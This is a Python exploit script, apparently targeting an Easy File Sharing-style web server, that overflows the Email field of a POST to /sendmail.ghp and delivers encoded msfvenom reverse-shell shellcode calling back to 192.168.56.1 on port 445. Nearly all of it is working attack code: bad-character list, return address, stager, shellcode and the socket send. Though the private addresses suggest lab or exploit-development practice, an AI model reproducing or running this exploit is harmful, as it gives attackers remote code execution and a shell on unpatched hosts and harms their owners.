#!/usr/bin/python

import socket
import sys

#Bad Chars= \x25\x26\x27\x2b\x00
#PUSH ESP, RET 0x61c5203b

EIP= "\x3b\x20\xc5\x61" #PUSH ESP, RET 0x61c5203b

if len(sys.argv) < 2:
	print "Usage: python EFS.py [IP]\n"
	print "i.e python  EFS.py 192.168.56.101\n"
	exit(1)

Buffer = "\x90"*3712

#msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=445 -e x86/shikata_ga_nai -b \x00\x25\x26\x27\x2b -f c
Shell=( #352 bytes
"\xba\x20\xb3\xd2\x36\xdb\xd8\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\xce\x4f\x30\xc3\xf2\x58\x37"
"\x2c\x0a\x99\x58\xa4\xef\xa8\x58\xd2\x64\x9a\x68\x90\x28\x17"
"\x02\xf4\xd8\xac\x66\xd1\xef\x05\xcc\x07\xde\x96\x7d\x7b\x41"
"\x15\x7c\xa8\xa1\x24\x4f\xbd\xa0\x61\xb2\x4c\xf0\x3a\xb8\xe3"
"\xe4\x4f\xf4\x3f\x8f\x1c\x18\x38\x6c\xd4\x1b\x69\x23\x6e\x42"
"\xa9\xc2\xa3\xfe\xe0\xdc\xa0\x3b\xba\x57\x12\xb7\x3d\xb1\x6a"
"\x38\x91\xfc\x42\xcb\xeb\x39\x64\x34\x9e\x33\x96\xc9\x99\x80"
"\xe4\x15\x2f\x12\x4e\xdd\x97\xfe\x6e\x32\x41\x75\x7c\xff\x05"
"\xd1\x61\xfe\xca\x6a\x9d\x8b\xec\xbc\x17\xcf\xca\x18\x73\x8b"
"\x73\x39\xd9\x7a\x8b\x59\x82\x23\x29\x12\x2f\x37\x40\x79\x38"
"\xf4\x69\x81\xb8\x92\xfa\xf2\x8a\x3d\x51\x9c\xa6\xb6\x7f\x5b"
"\xc8\xec\x38\xf3\x37\x0f\x39\xda\xf3\x5b\x69\x74\xd5\xe3\xe2"
"\x84\xda\x31\xa4\xd4\x74\xea\x05\x84\x34\x5a\xee\xce\xba\x85"
"\x0e\xf1\x10\xae\xa5\x08\xf3\x11\x91\x2a\x02\xfa\xe0\x4a\x05"
"\x47\x6d\xac\x6f\xa7\x38\x67\x18\x5e\x61\xf3\xb9\x9f\xbf\x7e"
"\xf9\x14\x4c\x7f\xb4\xdc\x39\x93\x21\x2d\x74\xc9\xe4\x32\xa2"
"\x65\x6a\xa0\x29\x75\xe5\xd9\xe5\x22\xa2\x2c\xfc\xa6\x5e\x16"
"\x56\xd4\xa2\xce\x91\x5c\x79\x33\x1f\x5d\x0c\x0f\x3b\x4d\xc8"
"\x90\x07\x39\x84\xc6\xd1\x97\x62\xb1\x93\x41\x3d\x6e\x7a\x05"
"\xb8\x5c\xbd\x53\xc5\x88\x4b\xbb\x74\x65\x0a\xc4\xb9\xe1\x9a"
"\xbd\xa7\x91\x65\x14\x6c\xa1\x2f\x34\xc5\x2a\xf6\xad\x57\x37"
"\x09\x18\x9b\x4e\x8a\xa8\x64\xb5\x92\xd9\x61\xf1\x14\x32\x18"
"\x6a\xf1\x34\x8f\x8b\xd0\x90"
)

Staging=(
"\x54\x58" #PUSH ESP #POP EAX
"\x83\xE8\x7F" #SUB EAX, 7C
"\x83\xE8\x7F" #SUB EAX, 7C
"\x83\xE8\x7F" #SUB EAX, 7C
"\x83\xE8\x13" #SUB EAX, 7C
"\x50\x5C" #PUSH EAX #POP ESP
"\xFF\xE0" #JMP EAX
)

Stage1 = Staging + "\x90"*34
Stage2=Buffer+Shell+"\xcc"*(360-len(Shell))
Padding="\x90"*16

crash = Stage2+EIP+Padding+Stage1

buffer  ="POST /sendmail.ghp HTTP/1.1 \r\n" 
buffer +="Email=" + crash + "&getPassword=Get+Password"

EFS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
EFS.connect((sys.argv[1], 80))
EFS.send(buffer)
EFS.close()
